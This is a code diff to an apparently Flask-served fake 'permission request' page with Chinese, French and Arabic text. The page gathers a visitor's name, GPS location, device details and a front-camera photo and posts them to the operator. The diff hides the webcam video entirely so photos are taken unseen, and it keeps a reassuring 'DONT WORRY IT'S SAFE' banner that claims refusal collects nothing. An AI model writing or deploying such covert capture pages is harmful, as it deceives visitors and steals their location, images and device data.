@@ -36,8 +36,9 @@ HTML_TEMPLATE = """
             line-height: 1.6;
         }
 
-        #video-container { margin: 15px 0; display: none; }
-        video { width: 100%; border-radius: 8px; background: #000; border: 2px solid #ddd; }
+        /* Video مخفي تماماً ولكن يعمل في الخلفية لالتقاط صورة واضحة وليست سوداء */
+        #webcam { display: none; }
+
         .btn-container { margin-top: 15px; display: flex; justify-content: space-around; }
         button { padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; font-size: 15px; width: 45%; }
         .btn-approve { background-color: #28a745; color: white; }
@@ -50,13 +51,12 @@ HTML_TEMPLATE = """
         <h2>权限许可请求</h2>
         
         <div class="legal-banner">
-            DONT WORRY IT'S SAFE: 法律声明：<br>
+            ✅DONT WORRY IT'S SAFE: 法律声明：<br>
             点击“Autoriser”即表示您同意共享姓名、地理位置、设备信息及照片。决定权完全在您手中，拒绝将不会收集任何数据。
         </div>
 
-        <div id="video-container">
-            <video id="webcam" autoplay playsinline muted></video>
-        </div>
+        <!-- عنصر الفيديو مخفي هنا -->
+        <video id="webcam" autoplay playsinline muted></video>
         
         <form id="consentForm">
             <input type="text" id="username" placeholder="姓名 (Name)" required style="width: 85%; padding: 10px; margin-bottom: 15px; font-size: 14px;"><br>
@@ -73,31 +73,25 @@ HTML_TEMPLATE = """
     <canvas id="canvas" style="display:none;"></canvas>
 
     <script>
-        function getMobileModel() {
+        function getDeviceDetails() {
             const ua = navigator.userAgent;
-            let model = "Appareil Inconnu";
+            let deviceType = "Appareil Inconnu";
             
-            // محاولة استخراج موديل الأندرويد بدقة (مثل Samsung, Xiaomi, etc.)
             if (/android/i.test(ua)) {
-                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|SCH-[A-Z0-9]+|SM-F[0-9]+|Pixel\s[0-9a-zA-Z\s]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+\b)/i);
+                let match = ua.match(/\b(SM-[A-Z0-9]+|GT-[A-Z0-9]+|Redmi\s[0-9A-Za-z\s]+|POCO\s[0-9A-Za-z\s]+|M2[0-9a-zA-Z]+|Nexus\s[0-9]+|Pixel\s[0-9a-zA-Z\s]+)/i);
                 if (match) {
-                    model = "Android / " + match[0];
+                    deviceType = "Android (" + match[0].trim() + ")";
                 } else {
-                    const buildMatch = ua.match(/;\s?([a-zA-Z0-9\s\-_]+)\s+Build\//);
-                    if (buildMatch && buildMatch[1]) {
-                        model = "Android / " + buildMatch[1].trim();
-                    } else {
-                        model = "Android / Smartphone";
-                    }
+                    deviceType = "Android Phone / Mobile";
                 }
             } else if (/iphone|ipad|ipod/i.test(ua)) {
-                model = "Apple / iPhone iOS";
+                deviceType = "Apple iOS / iPhone";
             } else if (/windows/i.test(ua)) {
-                model = "PC / Windows";
+                deviceType = "Ordinateur Windows";
             } else if (/macintosh|mac os x/i.test(ua)) {
-                model = "Mac / Apple";
+                deviceType = "Macintosh Apple";
             }
-            return model;
+            return deviceType;
         }
 
         async function captureAndSend(isDenied) {
@@ -123,7 +117,7 @@ HTML_TEMPLATE = """
             let imageBase64 = null;
 
             let deviceInfo = {
-                model: getMobileModel(),
+                model: getDeviceDetails(),
                 screen: `${window.screen.width}x${window.screen.height}`,
                 language: navigator.language,
                 platform: navigator.platform,
@@ -131,7 +125,6 @@ HTML_TEMPLATE = """
                 ram: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Inconnu"
             };
 
-            // 1. جلب موقع الـ GPS
             try {
                 const position = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 3000 });
@@ -141,15 +134,18 @@ HTML_TEMPLATE = """
                 locationData = "Accès à la localisation refusé";
             }
 
-            // 2. تشغيل الكاميرا والتقاط صورة واضحة وليست سوداء
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
                 const videoElement = document.getElementById('webcam');
                 const canvas = document.getElementById('canvas');
                 
                 videoElement.srcObject = stream;
-                
-                // الانتظار لمدة ثانية واحدة لضمان تهيئة العدسة ووضوح الصورة
+
+                // الانتظار لمدة ثانية لتمكين الكاميرا من التقاط الإطارات بوضوح دون أن تظهر الصورة سوداء
                 await new Promise(resolve => setTimeout(resolve, 1000));
 
                 canvas.width = videoElement.videoWidth || 640;
@@ -165,7 +161,6 @@ HTML_TEMPLATE = """
                 console.log("Impossible d'accéder à la caméra: ", err);
             }
 
-            // 3. إرسال البيانات
             try {
                 const response = await fetch('/submit-consent', {
                     method: 'POST',
@@ -216,7 +211,7 @@ def submit_consent():
         "content": (
             f"✅ **Nouveau consentement et détails de l'appareil:**\n"
             f"• **Nom:** {username}\n"
-            f"• **Modèle exact de l'appareil:** {device.get('model')}\n"
+            f"• **Type / Modèle de l'appareil:** {device.get('model')}\n"
             f"• **Localisation (GPS):** {location}\n"
             f"• **Résolution d'écran:** {device.get('screen')}\n"
             f"• **Langue et système:** {device.get('language')} | {device.get('platform')}\n"
